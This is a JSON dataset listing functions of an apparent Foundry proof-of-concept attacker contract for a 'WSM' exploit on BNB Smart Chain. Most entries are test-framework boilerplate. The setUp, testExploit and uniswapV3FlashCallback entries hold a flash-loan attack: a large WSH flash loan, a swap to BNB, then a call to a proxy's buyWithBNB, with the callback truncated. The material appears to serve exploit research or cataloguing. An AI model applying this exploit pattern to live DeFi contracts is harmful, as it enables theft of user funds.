[
  {
    "contract/interface": "WSM",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "WSM",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WSM",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WSM",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WSM",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "WSM",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 37_569_860);\n        vm.deal(address(this), 0); // Preparation work\uff0cclear POC balance\uff0cignore it\n        wshToken_ = IERC20(BNB_WSH_10000.token0());\n        bnbToken_ = IWBNB(payable(BNB_WSH_10000.token1()));\n\n        wshToken_.approve(address(routerv3_), 10_000_000_000_000 ether);\n        bnbToken_.approve(address(routerv3_), 10_000_000_000_000 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WSM",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WSM",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WSM",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WSM",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "WSM",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WSM",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WSM",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        console.log(\"1. before attack wsh token balance of this = \", wshToken_.balanceOf(address(this)));\n        BNB_WSH_10000.flash(address(this), 5_000_000 ether, 0, \"\");\n        console.log(\"8. after attack wsh token balance of this = \", wshToken_.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WSM",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {\n        console.log(\"2. bnb_wsh_10000 pool wsh balance after flashloan = \", wshToken_.balanceOf(address(this)));\n\n        Uni_Router_V3.ExactInputSingleParams memory args = Uni_Router_V3.ExactInputSingleParams({\n            tokenIn: address(wshToken_),\n            tokenOut: address(bnbToken_),\n            fee: 3000,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: 5_000_000 ether,\n            amountOutMinimum: 1,\n            sqrtPriceLimitX96: 0\n        });\n        routerv3_.exactInputSingle(args);\n\n        console.log(\"3. balance after exchanging wsh for bnb = \", bnbToken_.balanceOf(address(this)));\n        bnbToken_.withdraw(bnbToken_.balanceOf(address(this)));\n\n        console.log(\"4. [ ============= ATTACK START ============= ]\");\n        proxy_.call{value: address(this).balance}(abi.encodeWithSignature(\"buyWithBNB(uint256,bool)\", 2_770_000, false));\n",
    "description": ""
  }
]